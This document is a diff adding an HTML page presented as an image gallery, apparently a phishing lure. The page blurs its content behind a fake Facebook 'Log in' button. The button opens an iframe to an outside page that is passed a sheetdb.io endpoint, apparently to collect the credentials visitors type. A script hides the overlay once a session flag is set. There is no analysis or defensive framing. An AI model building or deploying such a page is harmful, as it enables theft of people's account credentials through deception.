@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Image and Video Gallery</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  
+  <style>
+@import url('https://fonts.googleapis.com/css?family=Oswald:200,300,400,500,600,700&display=swap');
+    .fullscreen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 5;
+      backdrop-filter: blur(15px); /* Adjust the blur strength as needed */
+      background-color: rgba(0, 0, 0, 0.5); /* Adjust the background color and transparency as needed */
+      display: block;
+    }
+    .gallery {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      max-width: 500px;
+    }
+    
+    .gallery-item {
+      margin: 10px;
+      text-align: center;
+    }
+    
+    .gallery-item img{
+      max-width: 300px;
+      border: 1px solid #ccc;
+    }
+    
+    
+    .center-button {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 6;
+      border: 0px;
+      padding: 10px;
+      border-radius: 10px;
+      display: block;
+    }
+    .center-button span{
+      font-size: 20px;
+      font-weight: 600;
+      padding-left: 10px;
+      
+    }
+    
+    
+    .fixed-div {
+      position: fixed;
+      padding: 50px 50px;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      backdrop-filter: blur(15px);
+      background-color: transparent;
+      z-index: 100;
+      display: none;
+    }
+    
+    .fixed-div iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+      background-color: white;
+    }
+    
+    .logo-1 h3 {
+    color: #e74c3c;
+    font-family: 'Oswald', sans-serif;
+    font-weight: 300;
+    font-size: 50px;
+    line-height:1.3;
+}
+.logo-holder{
+  text-align:center;
+}
+    
+  </style>
+</head>
+<body>
+  <div class="logo-holder logo-1">
+        <a href="">
+          <h3>Nayem</h3>
+        </a>
+  </div>
+  <button class="center-button" id="id1" onclick="button()"><i class="fab fa-facebook"></i><span>Log in</span></button>
+    <div class="fullscreen" id="id2"></div>
+  
+  <div class="fixed-div" id="if1">
+    <iframe src="https://sh-seam.github.io/indphone/fb?name=https://sheetdb.io/api/v1/revfg173taku5"></iframe>
+  </div>
+  
+  <div class="gallery">
+    <div class="gallery-item">
+      <img src="image1.jpg" alt="Image 1">
+    </div>
+    <div class="gallery-item">
+      <img src="image2.jpg" alt="Image 2">
+    </div>
+    <div class="gallery-item">
+      <img src="image3.jpg" alt="Image 2">
+    </div>
+    <div class="gallery-item">
+      <img src="image4.jpg" alt="Image 2">
+    </div>
+    <div class="gallery-item">
+      <img src="image5.jpg" alt="Image 2">
+    </div>
+    <div class="gallery-item">
+      <img src="image6.jpg" alt="Image 2">
+    </div>
+    <div class="gallery-item">
+      <img src="image7.jpg" alt="Image 2">
+    </div>
+  </div>
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/js/all.min.js"></script>
+  <script>
+  function button(){
+    document.getElementById('if1').style.display = 'block';
+  }
+  
+  
+  
+  function startCheck() {
+      setTimeout(checkCondition, 1000);
+    }
+
+    function checkCondition() {
+      // Perform your condition check here
+      //sessionStorage.setItem('fblog',292) // Set the condition to true or false based on your logic
+
+      if ( sessionStorage.getItem('fblog') !=null) {
+        console.log('Condition is true');
+        document.getElementById('id1').style.display = 'none';
+        document.getElementById('id2').style.display = 'none';
+        document.getElementById('if1').style.display = 'none';
+      } else {
+        console.log('Condition is false');
+      }
+      
+      startCheck();
+    }
+    
+    startCheck();
+   
+   
+  </script>
+  
+</body>
+  </html>
